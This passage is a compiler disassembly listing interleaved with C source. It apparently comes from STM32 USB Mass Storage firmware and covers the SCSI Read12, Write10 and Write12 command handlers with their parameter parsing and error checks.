 800a7ac:	33b0      	adds	r3, #176	; 0xb0
 800a7ae:	009b      	lsls	r3, r3, #2
 800a7b0:	4413      	add	r3, r2
 800a7b2:	685b      	ldr	r3, [r3, #4]
 800a7b4:	689b      	ldr	r3, [r3, #8]
 800a7b6:	7afa      	ldrb	r2, [r7, #11]
 800a7b8:	4610      	mov	r0, r2
 800a7ba:	4798      	blx	r3
 800a7bc:	4603      	mov	r3, r0
 800a7be:	2b00      	cmp	r3, #0
 800a7c0:	d008      	beq.n	800a7d4 <SCSI_Read12+0xaa>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a7c2:	7af9      	ldrb	r1, [r7, #11]
 800a7c4:	233a      	movs	r3, #58	; 0x3a
 800a7c6:	2202      	movs	r2, #2
 800a7c8:	68f8      	ldr	r0, [r7, #12]
 800a7ca:	f7ff fe0d 	bl	800a3e8 <SCSI_SenseCode>
      return -1;
 800a7ce:	f04f 33ff 	mov.w	r3, #4294967295
 800a7d2:	e067      	b.n	800a8a4 <SCSI_Read12+0x17a>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a7d4:	687b      	ldr	r3, [r7, #4]
 800a7d6:	3302      	adds	r3, #2
 800a7d8:	781b      	ldrb	r3, [r3, #0]
 800a7da:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a7dc:	687b      	ldr	r3, [r7, #4]
 800a7de:	3303      	adds	r3, #3
 800a7e0:	781b      	ldrb	r3, [r3, #0]
 800a7e2:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a7e4:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] <<  8) |
 800a7e6:	687b      	ldr	r3, [r7, #4]
 800a7e8:	3304      	adds	r3, #4
 800a7ea:	781b      	ldrb	r3, [r3, #0]
 800a7ec:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a7ee:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a7f0:	687a      	ldr	r2, [r7, #4]
 800a7f2:	3205      	adds	r2, #5
 800a7f4:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] <<  8) |
 800a7f6:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a7f8:	697a      	ldr	r2, [r7, #20]
 800a7fa:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a7fe:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a800:	687b      	ldr	r3, [r7, #4]
 800a802:	3306      	adds	r3, #6
 800a804:	781b      	ldrb	r3, [r3, #0]
 800a806:	061a      	lsls	r2, r3, #24
                         ((uint32_t)params[7] << 16) |
 800a808:	687b      	ldr	r3, [r7, #4]
 800a80a:	3307      	adds	r3, #7
 800a80c:	781b      	ldrb	r3, [r3, #0]
 800a80e:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a810:	431a      	orrs	r2, r3
                         ((uint32_t)params[8] << 8) |
 800a812:	687b      	ldr	r3, [r7, #4]
 800a814:	3308      	adds	r3, #8
 800a816:	781b      	ldrb	r3, [r3, #0]
 800a818:	021b      	lsls	r3, r3, #8
                         ((uint32_t)params[7] << 16) |
 800a81a:	4313      	orrs	r3, r2
                         (uint32_t)params[9];
 800a81c:	687a      	ldr	r2, [r7, #4]
 800a81e:	3209      	adds	r2, #9
 800a820:	7812      	ldrb	r2, [r2, #0]
                         ((uint32_t)params[8] << 8) |
 800a822:	4313      	orrs	r3, r2
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a824:	697a      	ldr	r2, [r7, #20]
 800a826:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a82a:	6713      	str	r3, [r2, #112]	; 0x70

    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a82c:	697b      	ldr	r3, [r7, #20]
 800a82e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a832:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a834:	697b      	ldr	r3, [r7, #20]
 800a836:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a83a:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a83c:	7af9      	ldrb	r1, [r7, #11]
 800a83e:	68f8      	ldr	r0, [r7, #12]
 800a840:	f000 fa4b 	bl	800acda <SCSI_CheckAddressRange>
 800a844:	4603      	mov	r3, r0
 800a846:	2b00      	cmp	r3, #0
 800a848:	da02      	bge.n	800a850 <SCSI_Read12+0x126>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a84a:	f04f 33ff 	mov.w	r3, #4294967295
 800a84e:	e029      	b.n	800a8a4 <SCSI_Read12+0x17a>
    }

    /* cases 4,5 : Hi <> Dn */
    if (hmsc->cbw.dDataLength != (hmsc->scsi_blk_len * hmsc->scsi_blk_size))
 800a850:	697b      	ldr	r3, [r7, #20]
 800a852:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a856:	699a      	ldr	r2, [r3, #24]
 800a858:	697b      	ldr	r3, [r7, #20]
 800a85a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a85e:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a860:	6979      	ldr	r1, [r7, #20]
 800a862:	f501 5180 	add.w	r1, r1, #4096	; 0x1000
 800a866:	f8b1 1064 	ldrh.w	r1, [r1, #100]	; 0x64
 800a86a:	fb01 f303 	mul.w	r3, r1, r3
 800a86e:	429a      	cmp	r2, r3
 800a870:	d00b      	beq.n	800a88a <SCSI_Read12+0x160>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a872:	697b      	ldr	r3, [r7, #20]
 800a874:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a878:	7f59      	ldrb	r1, [r3, #29]
 800a87a:	2320      	movs	r3, #32
 800a87c:	2205      	movs	r2, #5
 800a87e:	68f8      	ldr	r0, [r7, #12]
 800a880:	f7ff fdb2 	bl	800a3e8 <SCSI_SenseCode>
      return -1;
 800a884:	f04f 33ff 	mov.w	r3, #4294967295
 800a888:	e00c      	b.n	800a8a4 <SCSI_Read12+0x17a>
    }

    hmsc->bot_state = USBD_BOT_DATA_IN;
 800a88a:	697b      	ldr	r3, [r7, #20]
 800a88c:	2202      	movs	r2, #2
 800a88e:	721a      	strb	r2, [r3, #8]
  }
  hmsc->bot_data_length = MSC_MEDIA_PACKET;
 800a890:	697b      	ldr	r3, [r7, #20]
 800a892:	f44f 5280 	mov.w	r2, #4096	; 0x1000
 800a896:	60da      	str	r2, [r3, #12]

  return SCSI_ProcessRead(pdev, lun);
 800a898:	7afb      	ldrb	r3, [r7, #11]
 800a89a:	4619      	mov	r1, r3
 800a89c:	68f8      	ldr	r0, [r7, #12]
 800a89e:	f000 fa49 	bl	800ad34 <SCSI_ProcessRead>
 800a8a2:	4603      	mov	r3, r0
}
 800a8a4:	4618      	mov	r0, r3
 800a8a6:	3718      	adds	r7, #24
 800a8a8:	46bd      	mov	sp, r7
 800a8aa:	bd80      	pop	{r7, pc}

0800a8ac <SCSI_Write10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Write10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a8ac:	b580      	push	{r7, lr}
 800a8ae:	b086      	sub	sp, #24
 800a8b0:	af00      	add	r7, sp, #0
 800a8b2:	60f8      	str	r0, [r7, #12]
 800a8b4:	460b      	mov	r3, r1
 800a8b6:	607a      	str	r2, [r7, #4]
 800a8b8:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a8ba:	68fb      	ldr	r3, [r7, #12]
 800a8bc:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a8c0:	68fb      	ldr	r3, [r7, #12]
 800a8c2:	32b0      	adds	r2, #176	; 0xb0
 800a8c4:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a8c8:	617b      	str	r3, [r7, #20]
  uint32_t len;

  if (hmsc == NULL)
 800a8ca:	697b      	ldr	r3, [r7, #20]
 800a8cc:	2b00      	cmp	r3, #0
 800a8ce:	d102      	bne.n	800a8d6 <SCSI_Write10+0x2a>
  {
    return -1;
 800a8d0:	f04f 33ff 	mov.w	r3, #4294967295
 800a8d4:	e0c7      	b.n	800aa66 <SCSI_Write10+0x1ba>
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a8d6:	697b      	ldr	r3, [r7, #20]
 800a8d8:	7a1b      	ldrb	r3, [r3, #8]
 800a8da:	2b00      	cmp	r3, #0
 800a8dc:	f040 80bd 	bne.w	800aa5a <SCSI_Write10+0x1ae>
  {
    if (hmsc->cbw.dDataLength == 0U)
 800a8e0:	697b      	ldr	r3, [r7, #20]
 800a8e2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a8e6:	699b      	ldr	r3, [r3, #24]
 800a8e8:	2b00      	cmp	r3, #0
 800a8ea:	d10b      	bne.n	800a904 <SCSI_Write10+0x58>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a8ec:	697b      	ldr	r3, [r7, #20]
 800a8ee:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a8f2:	7f59      	ldrb	r1, [r3, #29]
 800a8f4:	2320      	movs	r3, #32
 800a8f6:	2205      	movs	r2, #5
 800a8f8:	68f8      	ldr	r0, [r7, #12]
 800a8fa:	f7ff fd75 	bl	800a3e8 <SCSI_SenseCode>
      return -1;
 800a8fe:	f04f 33ff 	mov.w	r3, #4294967295
 800a902:	e0b0      	b.n	800aa66 <SCSI_Write10+0x1ba>
    }

    /* case 8 : Hi <> Do */
    if ((hmsc->cbw.bmFlags & 0x80U) == 0x80U)
 800a904:	697b      	ldr	r3, [r7, #20]
 800a906:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a90a:	7f1b      	ldrb	r3, [r3, #28]
 800a90c:	b25b      	sxtb	r3, r3
 800a90e:	2b00      	cmp	r3, #0
 800a910:	da0b      	bge.n	800a92a <SCSI_Write10+0x7e>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a912:	697b      	ldr	r3, [r7, #20]
 800a914:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a918:	7f59      	ldrb	r1, [r3, #29]
 800a91a:	2320      	movs	r3, #32
 800a91c:	2205      	movs	r2, #5
 800a91e:	68f8      	ldr	r0, [r7, #12]
 800a920:	f7ff fd62 	bl	800a3e8 <SCSI_SenseCode>
      return -1;
 800a924:	f04f 33ff 	mov.w	r3, #4294967295
 800a928:	e09d      	b.n	800aa66 <SCSI_Write10+0x1ba>
    }

    /* Check whether Media is ready */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a92a:	68fb      	ldr	r3, [r7, #12]
 800a92c:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a930:	68fa      	ldr	r2, [r7, #12]
 800a932:	33b0      	adds	r3, #176	; 0xb0
 800a934:	009b      	lsls	r3, r3, #2
 800a936:	4413      	add	r3, r2
 800a938:	685b      	ldr	r3, [r3, #4]
 800a93a:	689b      	ldr	r3, [r3, #8]
 800a93c:	7afa      	ldrb	r2, [r7, #11]
 800a93e:	4610      	mov	r0, r2
 800a940:	4798      	blx	r3
 800a942:	4603      	mov	r3, r0
 800a944:	2b00      	cmp	r3, #0
 800a946:	d008      	beq.n	800a95a <SCSI_Write10+0xae>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a948:	7af9      	ldrb	r1, [r7, #11]
 800a94a:	233a      	movs	r3, #58	; 0x3a
 800a94c:	2202      	movs	r2, #2
 800a94e:	68f8      	ldr	r0, [r7, #12]
 800a950:	f7ff fd4a 	bl	800a3e8 <SCSI_SenseCode>
      return -1;
 800a954:	f04f 33ff 	mov.w	r3, #4294967295
 800a958:	e085      	b.n	800aa66 <SCSI_Write10+0x1ba>
    }

    /* Check If media is write-protected */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsWriteProtected(lun) != 0)
 800a95a:	68fb      	ldr	r3, [r7, #12]
 800a95c:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a960:	68fa      	ldr	r2, [r7, #12]
 800a962:	33b0      	adds	r3, #176	; 0xb0
 800a964:	009b      	lsls	r3, r3, #2
 800a966:	4413      	add	r3, r2
 800a968:	685b      	ldr	r3, [r3, #4]
 800a96a:	68db      	ldr	r3, [r3, #12]
 800a96c:	7afa      	ldrb	r2, [r7, #11]
 800a96e:	4610      	mov	r0, r2
 800a970:	4798      	blx	r3
 800a972:	4603      	mov	r3, r0
 800a974:	2b00      	cmp	r3, #0
 800a976:	d008      	beq.n	800a98a <SCSI_Write10+0xde>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, WRITE_PROTECTED);
 800a978:	7af9      	ldrb	r1, [r7, #11]
 800a97a:	2327      	movs	r3, #39	; 0x27
 800a97c:	2202      	movs	r2, #2
 800a97e:	68f8      	ldr	r0, [r7, #12]
 800a980:	f7ff fd32 	bl	800a3e8 <SCSI_SenseCode>
      return -1;
 800a984:	f04f 33ff 	mov.w	r3, #4294967295
 800a988:	e06d      	b.n	800aa66 <SCSI_Write10+0x1ba>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a98a:	687b      	ldr	r3, [r7, #4]
 800a98c:	3302      	adds	r3, #2
 800a98e:	781b      	ldrb	r3, [r3, #0]
 800a990:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a992:	687b      	ldr	r3, [r7, #4]
 800a994:	3303      	adds	r3, #3
 800a996:	781b      	ldrb	r3, [r3, #0]
 800a998:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a99a:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] << 8) |
 800a99c:	687b      	ldr	r3, [r7, #4]
 800a99e:	3304      	adds	r3, #4
 800a9a0:	781b      	ldrb	r3, [r3, #0]
 800a9a2:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a9a4:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a9a6:	687a      	ldr	r2, [r7, #4]
 800a9a8:	3205      	adds	r2, #5
 800a9aa:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] << 8) |
 800a9ac:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a9ae:	697a      	ldr	r2, [r7, #20]
 800a9b0:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a9b4:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[7] << 8) |
 800a9b6:	687b      	ldr	r3, [r7, #4]
 800a9b8:	3307      	adds	r3, #7
 800a9ba:	781b      	ldrb	r3, [r3, #0]
 800a9bc:	021b      	lsls	r3, r3, #8
                         (uint32_t)params[8];
 800a9be:	687a      	ldr	r2, [r7, #4]
 800a9c0:	3208      	adds	r2, #8
 800a9c2:	7812      	ldrb	r2, [r2, #0]
    hmsc->scsi_blk_len = ((uint32_t)params[7] << 8) |
 800a9c4:	4313      	orrs	r3, r2
 800a9c6:	697a      	ldr	r2, [r7, #20]
 800a9c8:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a9cc:	6713      	str	r3, [r2, #112]	; 0x70

    /* check if LBA address is in the right range */
    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a9ce:	697b      	ldr	r3, [r7, #20]
 800a9d0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a9d4:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a9d6:	697b      	ldr	r3, [r7, #20]
 800a9d8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a9dc:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a9de:	7af9      	ldrb	r1, [r7, #11]
 800a9e0:	68f8      	ldr	r0, [r7, #12]
 800a9e2:	f000 f97a 	bl	800acda <SCSI_CheckAddressRange>
 800a9e6:	4603      	mov	r3, r0
 800a9e8:	2b00      	cmp	r3, #0
 800a9ea:	da02      	bge.n	800a9f2 <SCSI_Write10+0x146>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a9ec:	f04f 33ff 	mov.w	r3, #4294967295
 800a9f0:	e039      	b.n	800aa66 <SCSI_Write10+0x1ba>
    }

    len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800a9f2:	697b      	ldr	r3, [r7, #20]
 800a9f4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a9f8:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a9fa:	697a      	ldr	r2, [r7, #20]
 800a9fc:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800aa00:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800aa04:	fb02 f303 	mul.w	r3, r2, r3
 800aa08:	613b      	str	r3, [r7, #16]

    /* cases 3,11,13 : Hn,Ho <> D0 */
    if (hmsc->cbw.dDataLength != len)
 800aa0a:	697b      	ldr	r3, [r7, #20]
 800aa0c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa10:	699b      	ldr	r3, [r3, #24]
 800aa12:	693a      	ldr	r2, [r7, #16]
 800aa14:	429a      	cmp	r2, r3
 800aa16:	d00b      	beq.n	800aa30 <SCSI_Write10+0x184>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800aa18:	697b      	ldr	r3, [r7, #20]
 800aa1a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa1e:	7f59      	ldrb	r1, [r3, #29]
 800aa20:	2320      	movs	r3, #32
 800aa22:	2205      	movs	r2, #5
 800aa24:	68f8      	ldr	r0, [r7, #12]
 800aa26:	f7ff fcdf 	bl	800a3e8 <SCSI_SenseCode>
      return -1;
 800aa2a:	f04f 33ff 	mov.w	r3, #4294967295
 800aa2e:	e01a      	b.n	800aa66 <SCSI_Write10+0x1ba>
    }

    len = MIN(len, MSC_MEDIA_PACKET);
 800aa30:	693b      	ldr	r3, [r7, #16]
 800aa32:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800aa36:	bf28      	it	cs
 800aa38:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800aa3c:	613b      	str	r3, [r7, #16]

    /* Prepare EP to receive first data packet */
    hmsc->bot_state = USBD_BOT_DATA_OUT;
 800aa3e:	697b      	ldr	r3, [r7, #20]
 800aa40:	2201      	movs	r2, #1
 800aa42:	721a      	strb	r2, [r3, #8]
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800aa44:	4b0a      	ldr	r3, [pc, #40]	; (800aa70 <SCSI_Write10+0x1c4>)
 800aa46:	7819      	ldrb	r1, [r3, #0]
 800aa48:	697b      	ldr	r3, [r7, #20]
 800aa4a:	f103 0210 	add.w	r2, r3, #16
 800aa4e:	693b      	ldr	r3, [r7, #16]
 800aa50:	68f8      	ldr	r0, [r7, #12]
 800aa52:	f002 faf3 	bl	800d03c <USBD_LL_PrepareReceive>
  else /* Write Process ongoing */
  {
    return SCSI_ProcessWrite(pdev, lun);
  }

  return 0;
 800aa56:	2300      	movs	r3, #0
 800aa58:	e005      	b.n	800aa66 <SCSI_Write10+0x1ba>
    return SCSI_ProcessWrite(pdev, lun);
 800aa5a:	7afb      	ldrb	r3, [r7, #11]
 800aa5c:	4619      	mov	r1, r3
 800aa5e:	68f8      	ldr	r0, [r7, #12]
 800aa60:	f000 f9fe 	bl	800ae60 <SCSI_ProcessWrite>
 800aa64:	4603      	mov	r3, r0
}
 800aa66:	4618      	mov	r0, r3
 800aa68:	3718      	adds	r7, #24
 800aa6a:	46bd      	mov	sp, r7
 800aa6c:	bd80      	pop	{r7, pc}
 800aa6e:	bf00      	nop
 800aa70:	2000010b 	.word	0x2000010b

0800aa74 <SCSI_Write12>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Write12(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800aa74:	b580      	push	{r7, lr}
 800aa76:	b086      	sub	sp, #24
 800aa78:	af00      	add	r7, sp, #0
 800aa7a:	60f8      	str	r0, [r7, #12]
 800aa7c:	460b      	mov	r3, r1
 800aa7e:	607a      	str	r2, [r7, #4]
 800aa80:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800aa82:	68fb      	ldr	r3, [r7, #12]
 800aa84:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800aa88:	68fb      	ldr	r3, [r7, #12]
 800aa8a:	32b0      	adds	r2, #176	; 0xb0
 800aa8c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800aa90:	617b      	str	r3, [r7, #20]
  uint32_t len;

  if (hmsc == NULL)
 800aa92:	697b      	ldr	r3, [r7, #20]
 800aa94:	2b00      	cmp	r3, #0
 800aa96:	d102      	bne.n	800aa9e <SCSI_Write12+0x2a>
  {
    return -1;
 800aa98:	f04f 33ff 	mov.w	r3, #4294967295
 800aa9c:	e0d7      	b.n	800ac4e <SCSI_Write12+0x1da>
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800aa9e:	697b      	ldr	r3, [r7, #20]
 800aaa0:	7a1b      	ldrb	r3, [r3, #8]
 800aaa2:	2b00      	cmp	r3, #0
 800aaa4:	f040 80cd 	bne.w	800ac42 <SCSI_Write12+0x1ce>
  {
    if (hmsc->cbw.dDataLength == 0U)
 800aaa8:	697b      	ldr	r3, [r7, #20]
 800aaaa:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aaae:	699b      	ldr	r3, [r3, #24]
 800aab0:	2b00      	cmp	r3, #0
 800aab2:	d10b      	bne.n	800aacc <SCSI_Write12+0x58>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800aab4:	697b      	ldr	r3, [r7, #20]
 800aab6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aaba:	7f59      	ldrb	r1, [r3, #29]
 800aabc:	2320      	movs	r3, #32
 800aabe:	2205      	movs	r2, #5
 800aac0:	68f8      	ldr	r0, [r7, #12]
 800aac2:	f7ff fc91 	bl	800a3e8 <SCSI_SenseCode>
      return -1;
 800aac6:	f04f 33ff 	mov.w	r3, #4294967295
 800aaca:	e0c0      	b.n	800ac4e <SCSI_Write12+0x1da>
    }

    /* case 8 : Hi <> Do */
    if ((hmsc->cbw.bmFlags & 0x80U) == 0x80U)
 800aacc:	697b      	ldr	r3, [r7, #20]
 800aace:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aad2:	7f1b      	ldrb	r3, [r3, #28]
 800aad4:	b25b      	sxtb	r3, r3
 800aad6:	2b00      	cmp	r3, #0
 800aad8:	da0b      	bge.n	800aaf2 <SCSI_Write12+0x7e>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800aada:	697b      	ldr	r3, [r7, #20]
 800aadc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aae0:	7f59      	ldrb	r1, [r3, #29]
 800aae2:	2320      	movs	r3, #32
 800aae4:	2205      	movs	r2, #5
 800aae6:	68f8      	ldr	r0, [r7, #12]
 800aae8:	f7ff fc7e 	bl	800a3e8 <SCSI_SenseCode>
      return -1;
 800aaec:	f04f 33ff 	mov.w	r3, #4294967295
 800aaf0:	e0ad      	b.n	800ac4e <SCSI_Write12+0x1da>
    }

    /* Check whether Media is ready */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800aaf2:	68fb      	ldr	r3, [r7, #12]
 800aaf4:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800aaf8:	68fa      	ldr	r2, [r7, #12]
 800aafa:	33b0      	adds	r3, #176	; 0xb0
 800aafc:	009b      	lsls	r3, r3, #2
 800aafe:	4413      	add	r3, r2
 800ab00:	685b      	ldr	r3, [r3, #4]
 800ab02:	689b      	ldr	r3, [r3, #8]
 800ab04:	7afa      	ldrb	r2, [r7, #11]
 800ab06:	4610      	mov	r0, r2
 800ab08:	4798      	blx	r3
 800ab0a:	4603      	mov	r3, r0
 800ab0c:	2b00      	cmp	r3, #0
 800ab0e:	d00b      	beq.n	800ab28 <SCSI_Write12+0xb4>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800ab10:	7af9      	ldrb	r1, [r7, #11]
 800ab12:	233a      	movs	r3, #58	; 0x3a
 800ab14:	2202      	movs	r2, #2
 800ab16:	68f8      	ldr	r0, [r7, #12]
 800ab18:	f7ff fc66 	bl	800a3e8 <SCSI_SenseCode>
      hmsc->bot_state = USBD_BOT_NO_DATA;
 800ab1c:	697b      	ldr	r3, [r7, #20]
 800ab1e:	2205      	movs	r2, #5
 800ab20:	721a      	strb	r2, [r3, #8]
      return -1;
 800ab22:	f04f 33ff 	mov.w	r3, #4294967295
 800ab26:	e092      	b.n	800ac4e <SCSI_Write12+0x1da>
    }

    /* Check If media is write-protected */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsWriteProtected(lun) != 0)
 800ab28:	68fb      	ldr	r3, [r7, #12]
 800ab2a:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800ab2e:	68fa      	ldr	r2, [r7, #12]
 800ab30:	33b0      	adds	r3, #176	; 0xb0
 800ab32:	009b      	lsls	r3, r3, #2
 800ab34:	4413      	add	r3, r2
 800ab36:	685b      	ldr	r3, [r3, #4]
 800ab38:	68db      	ldr	r3, [r3, #12]
 800ab3a:	7afa      	ldrb	r2, [r7, #11]
 800ab3c:	4610      	mov	r0, r2
 800ab3e:	4798      	blx	r3
 800ab40:	4603      	mov	r3, r0
 800ab42:	2b00      	cmp	r3, #0
 800ab44:	d00b      	beq.n	800ab5e <SCSI_Write12+0xea>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, WRITE_PROTECTED);
 800ab46:	7af9      	ldrb	r1, [r7, #11]
 800ab48:	2327      	movs	r3, #39	; 0x27
 800ab4a:	2202      	movs	r2, #2
 800ab4c:	68f8      	ldr	r0, [r7, #12]
 800ab4e:	f7ff fc4b 	bl	800a3e8 <SCSI_SenseCode>
      hmsc->bot_state = USBD_BOT_NO_DATA;
 800ab52:	697b      	ldr	r3, [r7, #20]
 800ab54:	2205      	movs	r2, #5
 800ab56:	721a      	strb	r2, [r3, #8]
      return -1;
 800ab58:	f04f 33ff 	mov.w	r3, #4294967295
 800ab5c:	e077      	b.n	800ac4e <SCSI_Write12+0x1da>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800ab5e:	687b      	ldr	r3, [r7, #4]
 800ab60:	3302      	adds	r3, #2
 800ab62:	781b      	ldrb	r3, [r3, #0]
 800ab64:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800ab66:	687b      	ldr	r3, [r7, #4]
 800ab68:	3303      	adds	r3, #3
 800ab6a:	781b      	ldrb	r3, [r3, #0]
 800ab6c:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800ab6e:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] << 8) |
 800ab70:	687b      	ldr	r3, [r7, #4]
 800ab72:	3304      	adds	r3, #4
 800ab74:	781b      	ldrb	r3, [r3, #0]
 800ab76:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800ab78:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800ab7a:	687a      	ldr	r2, [r7, #4]
 800ab7c:	3205      	adds	r2, #5
 800ab7e:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] << 8) |
 800ab80:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800ab82:	697a      	ldr	r2, [r7, #20]
 800ab84:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ab88:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800ab8a:	687b      	ldr	r3, [r7, #4]
 800ab8c:	3306      	adds	r3, #6
 800ab8e:	781b      	ldrb	r3, [r3, #0]
